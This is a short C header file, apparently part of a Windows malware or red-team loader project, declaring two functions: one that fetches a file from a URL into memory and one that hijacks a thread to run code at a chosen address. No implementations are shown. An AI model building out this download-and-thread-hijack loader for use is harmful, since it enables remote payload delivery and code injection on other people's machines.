#pragma once
#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <Windows.h>

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);
BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pStartAddress);

#endif
